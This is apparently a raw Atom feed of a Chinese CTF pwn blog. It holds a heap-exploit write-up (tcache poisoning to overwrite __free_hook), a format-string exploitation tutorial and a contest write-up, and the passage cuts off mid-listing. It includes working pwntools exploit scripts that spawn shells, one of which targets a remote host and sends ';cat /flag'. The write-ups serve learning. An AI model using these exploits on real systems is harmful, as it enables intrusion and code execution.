class="keyword">int</span> <span class="title">sub_A60</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">size_t</span> <span class="built_in">size</span>; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; qword_202060[i]; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">17</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"full"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"size:"</span>);</span><br><span class="line">  result = sub_BB9();</span><br><span class="line">  LODWORD(<span class="built_in">size</span>) = result;</span><br><span class="line">  <span class="keyword">if</span> ( result &lt;= <span class="number">0x78</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    qword_202060[i] = <span class="built_in">malloc</span>(result);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"content:"</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, qword_202060[i], <span class="built_in">size</span>);</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"done"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一题不能开辟堆块大小满足unsorted bin 的堆块。</p><p>这一题主要思路就是通过getchar()触发malloc_consolidate ,然后出现main_arena地址在堆块中，然后通过getchar()部分修改去打stdout。然后同样使用getchar()来制造tcache poisoning来攻击__free_hook 修改为system地址，最后getshell。</p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">exec_file=<span class="string">"./new_heap"</span></span><br><span class="line">context.binary=exec_file</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">elf=ELF(exec_file,checksec = <span class="literal">False</span>)</span><br><span class="line">argv = [<span class="string">"/glibc/x64/2.29/lib/ld-2.29.so"</span>,<span class="string">"--library-path"</span>,</span><br><span class="line">        <span class="string">"/glibc/x64/2.29/lib/"</span>,<span class="string">"./new_heap"</span>]</span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    p=process(argv=argv)</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote()</span><br><span class="line">    libc=ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    n = globals()</span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> n.items():</span><br><span class="line">        <span class="keyword">if</span> value == address:</span><br><span class="line">            <span class="keyword">return</span> success(key+<span class="string">"  ==&gt;  "</span>+hfuck(address))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(idx)</span>:</span></span><br><span class="line">        p.sendlineafter(<span class="string">"3.exit\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content=<span class="string">"A"</span>)</span>:</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"size:"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"content:"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'exit'</span>,str(<span class="number">3</span>))</span><br><span class="line">    p.sendafter(<span class="string">'sure?'</span>,content)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">            add(<span class="number">0x38</span>,<span class="string">'A\n'</span>)</span><br><span class="line">        add(<span class="number">0x38</span>)</span><br><span class="line">        add(<span class="number">0x38</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">            delete(i)</span><br><span class="line"></span><br><span class="line">        fuck(<span class="string">'A'</span>*<span class="number">0x38</span>+p64(<span class="number">0x41</span>))</span><br><span class="line">        add(<span class="number">0x18</span>,<span class="string">'A\n'</span>)</span><br><span class="line">        delete(<span class="number">7</span>)</span><br><span class="line">        add(<span class="number">0x38</span>)</span><br><span class="line">        delete(<span class="number">8</span>)</span><br><span class="line">        add(<span class="number">0x18</span>)</span><br><span class="line">        add(<span class="number">0x18</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x3f</span>):</span><br><span class="line">            fuck(<span class="string">""</span>)</span><br><span class="line">        fuck(<span class="string">'A'</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+<span class="string">'A'</span>*<span class="number">0x20</span>+<span class="string">"\x60\x27"</span>)</span><br><span class="line">        add(<span class="number">0x38</span>)</span><br><span class="line">        add(<span class="number">0x38</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br><span class="line">        p.recvuntil(p64(<span class="number">0xfbad1800</span>))</span><br><span class="line">        p.recvuntil(<span class="string">"\x7f"</span>)</span><br><span class="line">        libc_base = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)<span class="number">-131</span>-libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]</span><br><span class="line">        fuck(libc_base)</span><br><span class="line">        delete(<span class="number">12</span>,<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x41</span>):</span><br><span class="line">            fuck(<span class="string">""</span>)</span><br><span class="line">        fuck(<span class="string">"A"</span>*<span class="number">0x20</span>+p64(libc_base+libc.symbols[<span class="string">"__free_hook"</span>]))</span><br><span class="line">        add(<span class="number">0x18</span>,<span class="string">'/bin/sh\x00'</span>,<span class="literal">False</span>)</span><br><span class="line">        add(<span class="number">0x18</span>,p64(libc_base+libc.symbols[<span class="string">"system"</span>]),<span class="literal">False</span>)</span><br><span class="line">        delete(<span class="number">15</span>,<span class="literal">False</span>)</span><br><span class="line">        p.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        p=process(argv=argv)</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;D3CTF那天去打红帽杯了，但是D3CTF 结束后，和其他师傅交流了一下，这道题不错 。而且这道题考点很清奇。&lt;/p&gt;
&lt;p&gt;首先我们来看一下这一题开启的保护和使用的libc版本&lt;/p&gt;
&lt;p&gt;题目附件:&lt;a href=&quot;./new_heap_update.zip&quot;&gt;new
      
    
    </summary>
    
    
      <category term="pwn学习" scheme="http://Whali3n51.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="UAF" scheme="http://Whali3n51.github.io/tags/UAF/"/>
    
      <category term="buffer in heap" scheme="http://Whali3n51.github.io/tags/buffer-in-heap/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串专题总结</title>
    <link href="http://whali3n51.github.io/2019/12/10/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <id>http://whali3n51.github.io/2019/12/10/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%93%E9%A2%98%E6%80%BB%E7%BB%93/</id>
    <published>2019-12-10T07:27:11.000Z</published>
    <updated>2020-02-08T14:17:56.219Z</updated>
    
    <content type="html"><![CDATA[<p>最近比赛有太多的格式化字符串漏洞，今天就来总结一下常见的格式化字符串。由易到难的讲解格式化字符串的利用和最近遇到格式化字符串的考点。</p><h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><p>格式化字符串一般都是程序员为了偷懒而导致的漏洞。为了输出字符串，而直接使用printf(&amp;buf)来打印字符串。今天我们从原理上来讲解这样写为什么会产生漏洞。</p><p>正常的使用printf(“%s”,&amp;buf);来打印字符串</p><p>当call printf的时候栈上的结构为：</p><p><img src="./1.png" alt=""></p><p>这样函数就打印出第二个参数的地址上的字符串,这样就能正常打印出‘aaaa’。printf函数识别出‘%s’是一个格式化字符串，然后根据这个格式化字符串去取参数，’%s‘默认取第二个参数为作为字符串输出地址也就是‘%s’的下面一个栈空间，这样就能打印出‘aaaa’。</p><p>如果我们程序员偷懒，不使用格式化字符串，那么我们还是能打印出来。</p><p><img src="./2.png" alt=""></p><p>因为printf没有解析到格式化字符串，直接将‘aaaa’作为格式化字符串输出了。这原理就像是我们平时用printf(“hello world !!”);这个道理是一样的。但是这个时候和printf(“hello world !!”);不一样的是，字符串是我们能控制的，这个时候漏洞就出现了。</p><h2 id="32位格式化字符串利用"><a href="#32位格式化字符串利用" class="headerlink" title="32位格式化字符串利用"></a>32位格式化字符串利用</h2><p>如果我任意构造一个格式化字符串，printf就会去解析，然后就根据解析的内容，去栈上都读偏移，然后执行相应的功能。</p><p>例如，我们输入一个‘%s’的格式化字符串，我们来分析他的原理。</p><p><img src="./3.png" alt=""></p><p>同理，printf解析出‘%s’了，相应的他要读出printf的第二个参数上的值。可是我们又没有给第二个参数，但是在程序里面，确认参数是不看你有没有输入，而是看栈的偏移。对于printf来说，第一个参数是栈顶，第二个参数是当前的[esp+4],第三个参数是[esp+8],依次类推。这里也就是输出‘&amp;buf’栈空间下面那个地址上的值。但是这个地方不确定是不是地址，所以程序可能打印失败。</p><p>但是格式化字符串给了一个我们可以自动定位的一个格式化字符串‘%n$’的参数。也就是在这里可以自己定位栈空间。</p><p>如果我们在这个给的是这‘%4$s’+p32(&amp;’hello world’)</p><p><img src="./4.png" alt=""></p><p>所以这个时候打印出来的就是’hello world’了。这个printf解析出有格式化串‘%4$s‘，也就是将buf栈下第4个栈空间的地址上的值当作字符串打印出来。注意这个p32(&amp;”hello world”)在这里只是做举例用，这个值我们可以写做任意一个值，也就是说我们能泄露任意地址上的值。这就达到了任意地址泄露。</p><p>当然达到任意地址泄露往往只是成功了一半，我们还需要达到任意地址写。</p><p>这个时候printf又提供了一个参数’%n‘,这个参数是将前面打印出来的字符数量写入到第二个参数的所指向的地址上的值。这个时候配合’%c‘可以写任意的值。当然这个’%n‘也可以结合’n$‘来使用，可以定位在栈上偏移。</p><p>例如，我们想在0x80000000(只是举例，不保证地址的合法性)上面写一个0x66666666</p><p>我们应该这样构造出这样的栈</p><p><img src="./5.png" alt=""></p><p>payload应该是这样%1717986918c%7$n+p32(0x80000000),这样就可以在0x80000000上面写0x66666666。</p><p>但是一般这样写有个问题，靠%1717986918c打印出0x66666666需要很长时间，一般程序会死掉，所以不能直接这么写。但是printf还提供了一个%n同类的格式化字符串</p><p>%n        一次性写入四个字节</p><p>%hn    一次性写入两个字节</p><p>%hhn        一次性写入一个字节</p><p>然后我们可以这样构造</p><p>%26214c%8$hn%9$hnaaa+p32(0x80000000)+p32(0x80000002)</p><p>注意，构造的时候，在格式化的串直接不有’\x00‘字符串截断，不然printf不能解析格式化字符串了。</p><p><img src="./6.png" alt=""></p><p>这样就可以任意地址写了。</p><p>一般来说，格式化字符串就是通过任意地址读写，来泄露got和修改got表来达到劫持程序流程。</p><p>pwntools整合了32位格式化字符串的利用。</p><p>fmtstr_payload(offset,{target_addr:value},write_size=’short’)自动就生成了payload,但是我不建议新手直接使用这个函数。</p><p>原理讲解到这里了，来个例子：</p><p>题目链接：<a href=""></a></p><h2 id="64位格式化字符串利用"><a href="#64位格式化字符串利用" class="headerlink" title="64位格式化字符串利用"></a>64位格式化字符串利用</h2><p>64位的和32位的利用方式其实是差不多的，唯一的差别就是64位的传参方式不一样，所以偏移量不一样。64位传参方式是rdi,rsi,rdx,rcx,r8,r9。第一个参数已经被我们格式化字符串占用了，所以第%1$p是rsi的值，然后往后顺延，直到%6$p是栈上第一个数据，然后后面和32位差不多了。</p><p>但是64位和32位还有一点不同的是，32位的地址一般能沾满整个栈单元，没有’\x00’字符，所以就不会无论地址写在格式化字符串前或者后面，都不会会造成格式化字符串的截断，但是64位不同，64位的地址一般不会沾满整个栈单元，一般只使用六个字节。所以会有’\x00’截断，如果把地址写在格式化字符串的前面，那么就会产生’\x00’截断，导致后面格式化字符串被截断不执行。</p><p>好了  这里也举个例子说一下吧。</p><p>题目链接</p><h2 id="Ebp-chain修改任意地址"><a href="#Ebp-chain修改任意地址" class="headerlink" title="Ebp chain修改任意地址"></a>Ebp chain修改任意地址</h2><p>Ebp chain是格式化字符串比较高级的利用方式，前两种利用方式是我们输入的值直接在栈上，但是如果我们输入的值全在bss段上，那么我们怎么做到修改格式化字符串呢？</p><p>通过上面的知识我们得知，想要修改或者读一个地址的值，那么这个地址就得在栈上。所以我们要想办法把这个地址写到栈上。这个说起来有点抽象，还是举个例子吧。</p><p>这是swupctf的一道题。</p><p>题目链接：<a href="login">login</a></p><p>首先我们进IDA看一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_804854B</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your password: "</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    s1[<span class="built_in">read</span>(<span class="number">0</span>, s1, <span class="number">0x32</span>u)] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">"wllmmllw"</span>, <span class="number">8u</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This is the wrong password: "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(s1);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Login successfully! Have fun!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们发现这是个无次数限制的格式化字符串利用。但是这里往bss段上写，不能像上面那样利用。这个时候我们看一下我们利用的时候，栈上的数据</p><p><img src="./7.png" alt=""></p><p>我们能看到栈上ebp的指针指向上一个ebp。上一个ebp指向上上个ebp。我们前面是不是说过只要有地址，我们就能往这个地址上写任意的值。</p><p>这个时候我们可以这样利用。这里我们为了叙述，我们把当前ebp叫ebp1,我们上一个ebp叫ebp2,我们把上上个ebp叫做ebp3。</p><p>这个时候我们需要转换思维，既然这个有值是栈地址，我们就不需要去修改got表再劫持程序了，我们直接修改老eip。</p><p>我们可以这样利用，我们通过ebp1将ebp2的值，让他指向一个老eip。所以然后就可以利用了。然后通过ebp2去修改老eip的值。最后改为system地址</p><p>我的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./login"</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">elf=ELF(<span class="string">"./login"</span>)</span><br><span class="line">bss=<span class="number">0x804B0A0</span>+<span class="number">0xc</span>+<span class="number">0x10</span></span><br><span class="line">p.sendlineafter(<span class="string">"Please input your name: "</span>,<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%6$p'</span></span><br><span class="line">gdb.attach(p,<span class="string">''' b *0x080485AF '''</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Please input your password: "</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">stack_addr=int(p.recv(<span class="number">8</span>),<span class="number">16</span>)+<span class="number">0x10</span></span><br><span class="line"><span class="keyword">print</span> hex(stack_addr)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%15$p'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">libc_start_main=int(p.recv(<span class="number">8</span>),<span class="number">16</span>)<span class="number">-247</span></span><br><span class="line">libc=LibcSearcher(<span class="string">"__libc_start_main"</span>,libc_start_main)</span><br><span class="line">system=libc_start_main-libc.dump(<span class="string">"__libc_start_main"</span>)+libc.dump(<span class="string">"system"</span>)</span><br><span class="line">str_bin_sh=libc_start_main-libc.dump(<span class="string">"__libc_start_main"</span>)+libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%'</span>+str((stack_addr&amp;<span class="number">0xff</span>)<span class="number">-0xc</span>)+<span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((system&amp;<span class="number">0xffff</span>))+<span class="string">'c%10$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((stack_addr&amp;<span class="number">0xff</span>)<span class="number">-0xc</span>+<span class="number">2</span>)+<span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((system&gt;&gt;<span class="number">16</span>))+<span class="string">'c%10$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%'</span>+str((stack_addr&amp;<span class="number">0xff</span>)<span class="number">-0x4</span>)+<span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((str_bin_sh&amp;<span class="number">0xffff</span>))+<span class="string">'c%10$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((stack_addr&amp;<span class="number">0xff</span>)<span class="number">-0x4</span>+<span class="number">2</span>)+<span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((str_bin_sh&gt;&gt;<span class="number">16</span>))+<span class="string">'c%10$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">gdb.attach(p,<span class="string">''' b *0x080485AF '''</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%'</span>+str((stack_addr&amp;<span class="number">0xff</span>)<span class="number">-8</span>)+<span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">p.sendafter(<span class="string">"Try again!\n"</span>,<span class="string">"wllmmllw"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近比赛有太多的格式化字符串漏洞，今天就来总结一下常见的格式化字符串。由易到难的讲解格式化字符串的利用和最近遇到格式化字符串的考点。&lt;/p&gt;
&lt;h2 id=&quot;漏洞原理分析&quot;&gt;&lt;a href=&quot;#漏洞原理分析&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理分析
      
    
    </summary>
    
    
      <category term="pwn总结" scheme="http://Whali3n51.github.io/categories/pwn%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="格式化字符串" scheme="http://Whali3n51.github.io/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>安询杯pwn_wp</title>
    <link href="http://whali3n51.github.io/2019/12/01/%E5%AE%89%E8%AF%A2%E6%9D%AFwp_pwn/"/>
    <id>http://whali3n51.github.io/2019/12/01/%E5%AE%89%E8%AF%A2%E6%9D%AFwp_pwn/</id>
    <published>2019-12-01T05:40:00.000Z</published>
    <updated>2020-01-08T06:58:46.616Z</updated>
    
    <content type="html"><![CDATA[<h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>简单说一下这个比赛，感觉这个比赛难度还是不错的，刚刚好，侥幸拿到了一个一血。其中有三道盲打pwn，两道格式化字符串的，一道rop的盲打。rop那道是真的没什么思路，还有一道路由器的pwn,我不知道为什么运行不了二进制文件，可能我环境配置的问题吧。</p><h2 id="0x01-fmt32"><a href="#0x01-fmt32" class="headerlink" title="0x01 fmt32"></a>0x01 fmt32</h2><h3 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h3><p>这一道题通过题目描述，只给了容器，然后看题目名为32位格式化字符串，并没有像往常的pwn题那样给二进制文件。所以这个时候大致猜测为盲打pwn。</p><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p>这道题侥幸拿到了一个一血，顺便总结一下我自己认为的格式化字符串盲打的想法吧。首先就是利用’%p’通过格式化字符串将栈上数据全部打印出来。打印出来，会得到两个信息，一个是我们输入的值是在栈上，另一个是发现有一个text段的地址，这个时候就能得到程序的基址，而且程序没有开启pie。按照一般的思路，这个时候可以用%s将整个程序dump出来。但是我没有这么做，我嫌效率太低。我直接猜测的got表的地址。我为什么这么做呢。因位got表的偏移和text的偏移是固定的，想知道这个偏移，随便打开一个32位程序就知道了，接下来就是不断尝试printf在got表的地址了。然后后面就是格式化字符串的利用了。</p><p>下面是我的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">'47.108.135.45'</span>,<span class="number">10001</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">addr=<span class="number">0x804A014</span></span><br><span class="line">payload=<span class="string">'a'</span>+p32(addr)+<span class="string">'%'</span>+<span class="string">'8'</span>+<span class="string">'$s'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Please tell me:"</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'Repeater:a'</span>)</span><br><span class="line">p.recv(<span class="number">4</span>)</span><br><span class="line">printf_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">"printf"</span>,printf_addr)</span><br><span class="line">system=printf_addr-libc.dump(<span class="string">"printf"</span>)+libc.dump(<span class="string">"system"</span>)</span><br><span class="line">payload=<span class="string">'a'</span>+p32(addr)+p32(addr+<span class="number">2</span>)+<span class="string">'%'</span>+str((system&amp;<span class="number">0xffff</span>)<span class="number">-0x12</span>)+<span class="string">'c%8$hn'</span>+<span class="string">'%'</span>+str((system&gt;&gt;<span class="number">16</span>)-((system&amp;<span class="number">0xffff</span>)<span class="number">-0x12</span>)<span class="number">-18</span>)+<span class="string">'c%9$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Please tell me:"</span>,payload)</span><br><span class="line"><span class="keyword">print</span> hex(system)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">";cat /flag"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x02-fmt64"><a href="#0x02-fmt64" class="headerlink" title="0x02 fmt64"></a>0x02 fmt64</h2><h3 id="introduction-1"><a href="#introduction-1" class="headerlink" title="introduction"></a>introduction</h3><p>这一道题和上一道题一样，不过这一道题给了一个txt,里面描述如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> readelf -s stilltest</span></span><br><span class="line">Symbol table '.dynsym' contains 15 entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)</span><br><span class="line">     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strlen@GLIBC_2.2.5 (2)</span><br><span class="line">     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND setbuf@GLIBC_2.2.5 (2)</span><br><span class="line">     4: 0000000000000000     0 FUNC    GLOBAL 